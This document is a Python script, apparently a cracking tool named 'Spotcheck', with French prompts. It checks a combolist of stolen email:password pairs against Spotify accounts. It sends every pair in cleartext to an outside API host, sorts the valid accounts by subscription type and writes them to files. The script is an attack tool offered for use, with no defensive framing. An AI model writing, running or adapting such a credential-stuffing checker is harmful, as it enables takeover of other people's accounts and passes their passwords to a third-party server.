import os,sys,requests,json

banner = """ 
.▄▄ ·  ▄▄▄·      ▄▄▄▄▄ ▄▄·  ▄ .▄▄▄▄ . ▄▄· ▄ •▄ 
▐█ ▀. ▐█ ▄█▪     •██  ▐█ ▌▪██▪▐█▀▄.▀·▐█ ▌▪█▌▄▌▪
▄▀▀▀█▄ ██▀· ▄█▀▄  ▐█.▪██ ▄▄██▀▐█▐▀▀▪▄██ ▄▄▐▀▀▄·
▐█▄▪▐█▐█▪·•▐█▌.▐▌ ▐█▌·▐███▌██▌▐▀▐█▄▄▌▐███▌▐█.█▌
 ▀▀▀▀ .▀    ▀█▄▀▪ ▀▀▀ ·▀▀▀ ▀▀▀ · ▀▀▀ ·▀▀▀ ·▀  ▀

 By Kynda - Version 1.0

"""
barrier = "----------------------------------------------------"
account_number = 0
account_hits = 0
account_fail = 0
account_premium = 0
account_position = 1
account_family = 0
account_student = 0
api = "http://sayank-km.xyz/api/"
#Function 

def cls():
    os.system('cls')

def save(filetype,email,password):
    save = open(filetype,"a")
    save.write(email+":"+password+"\n")
    save.close()



#Main program
cls()
print(banner)

#Open combolist
filename = input("Nom de la combolist (Exemple: combo.txt) : ")
cls()
try:
    file = open(filename,"r")
except:
    sys.exit("[!] Erreur : Aucun fichier de ce type.")
combo = file.readlines()
file.close()

#Count
for i in combo:
    account_number+=1
print("Account loaded: " + str(account_number))

for line in combo:
    line = line.strip()
    account = line.split(":")
    email = account[0]
    password = account[1]
    check = "?email="+email+"&pass="+password
    url = api+check
    try:
        r = requests.get(url,timeout=10).text
    except:
        print("[!] Erreur de connexion.")
        combo.append(line)
        pass
    if "fail" in r:
        print("["+str(account_position)+"/"+str(account_number)+"] "+email+":"+password)
        account_position+=1
        account_fail+=1
    elif "Spotify Free" in r:
        print(barrier)
        print("[+] ["+str(account_position)+"/"+str(account_number)+"] "+email+":"+password)
        print("[+] Account type: Spotify Free")
        print(barrier)
        account_position+=1
        account_hits+=1
        save("free.txt",email,password)
    elif "Premium for Family" in r:
        print(barrier)
        print("[+] ["+str(account_position)+"/"+str(account_number)+"] "+email+":"+password)
        print("[+] Account type: Spotify Premium Family")
        print(barrier)
        account_position+=1
        account_premium+=1
        save("family.txt",email,password)
    elif "Spotify Premium" in r:
        print(barrier)
        print("[+] ["+str(account_position)+"/"+str(account_number)+"] "+email+":"+password)
        print("[+] Account type: Spotify Premium")
        print(barrier)
        account_position+=1
        account_premium+=1
        save("premium.txt",email,password)
    elif "Premium for Students" in r:
        print(barrier)
        print("[+] ["+str(account_position)+"/"+str(account_number)+"] "+email+":"+password)
        print("[+] Account type: Premium Student")
        print(barrier)
        account_position+=1
        account_premium+=1
        save("student.txt",email,password)
    else:
        print(r)

cls()
print(barrier)
print("[STATS]")
print("Total account : "+ str(account_number)) 
print("Account Failed: " + str(account_fail))
print("Account Free : " + str(account_hits))
print("Account Premium : " +str(account_premium))
print("Account Family : " + str(account_family))
print("Account student : " + str(account_student))
print(barrier)
